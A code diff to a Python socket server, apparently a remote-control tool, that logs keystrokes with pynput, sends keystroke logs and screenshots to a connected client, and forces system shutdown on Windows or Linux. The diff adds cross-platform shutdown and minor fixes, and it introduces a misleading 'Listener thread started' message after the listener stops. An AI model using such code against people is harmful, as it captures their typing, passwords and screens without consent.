@@ -7,6 +7,7 @@ import tkinter as tk
 import threading
 from pynput import keyboard
 import atexit
+import platform
 
 HOST = "127.0.0.1"
 PORT = 65431
@@ -40,12 +41,12 @@ def handle_client(client_socket):
     while (True):
         data = client_socket.recv(1024).decode()
         data = str(data)
-        print(f"Hanle event of key stroke : {data}")
+        print(f"Handle event of key stroke : {data}")
         if (data == "HOOK"):
             if listener_thread:
                 stop_event.set()
                 listener_thread.join()
-                print("Listener thread stopped.")
+                print("Listener thread started.")
             stop_event.clear()
             listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
             listener_thread.start()
@@ -69,7 +70,8 @@ def handle_client(client_socket):
                 with open('log.txt', 'rb') as file:
                     file_data = file.read()
             else: 
-                file_data = b"?"
+                file_data = b"nothing to print"
+            
             client_socket.sendall(file_data)
 
             # Recreate the thread
@@ -98,10 +100,10 @@ def take_screenshot(client_socket):
     screenshot = pyautogui.screenshot()
     screenshot.save("screenshot.png") 
 
-    file = open("screenshot.png", 'rb');
-    image_data = file.read(2048);
+    file = open("screenshot.png", 'rb')
+    image_data = file.read(2048)
     while (image_data):
-        client_socket.send(image_data);
+        client_socket.send(image_data)
         image_data = file.read(2048)
     file.close()
     print("Screenshot sent")
@@ -152,7 +154,10 @@ def ShutDown(countdown_seconds=10):
         else:
             ShutDownRoot.destroy()
             print("Shutting down the system...")
-            os.system("sudo shutdown -h now")
+            if platform.system() == "Windows":
+                os.system("shutdown /s /f /t 0")
+            elif platform.system() == "Linux":
+                os.system("sudo shutdown -h now")
 
     ShutDownRoot.after(1000, update_time)
     ShutDownRoot.mainloop()
